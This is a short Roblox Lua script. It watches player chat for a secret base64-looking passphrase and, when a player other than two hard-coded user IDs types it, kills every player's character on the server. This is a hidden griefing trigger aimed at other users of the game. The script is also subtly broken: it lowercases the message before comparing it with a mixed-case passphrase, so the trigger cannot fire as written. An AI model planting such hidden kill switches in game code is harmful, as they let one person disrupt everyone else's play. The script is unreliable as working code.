-- одна (килл)
function onChatMessage(player, message)
    if message:lower() == "0LjQtNC4INCyINC30LDQtNC90LjRhtGDINGN0YLQviDQtNC70Y8g0LDQtNC80LjQvdC+0LIg0YTRg9C90LrRhtC40LggMjU1NjUg0LzQsNC50L3QutGA0LDRhNGCINGB0YrQtdC70Lgg0YDQvtCx0LvQvtC60YEgc3VrdW5hIGJhdHRsZWdyb3VuZHM=" then 
if player.UserId ~= 6036506267 and player.UserId ~= 4636825706 then
 function getAllPlayers()
    local players = game:GetService("Players"):GetPlayers()
    return players
end
 allPlayers = getAllPlayers()
        for _, p in ipairs(allPlayers) do
 p.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
     end
   end
    end
end

function onPlayerAdded(player)
    player.Chatted:Connect(function(message)
        onChatMessage(player, message)
    end)
end

game.Players.PlayerAdded:Connect(onPlayerAdded)

for _, player in ipairs(game.Players:GetPlayers()) do
    onPlayerAdded(player)
end

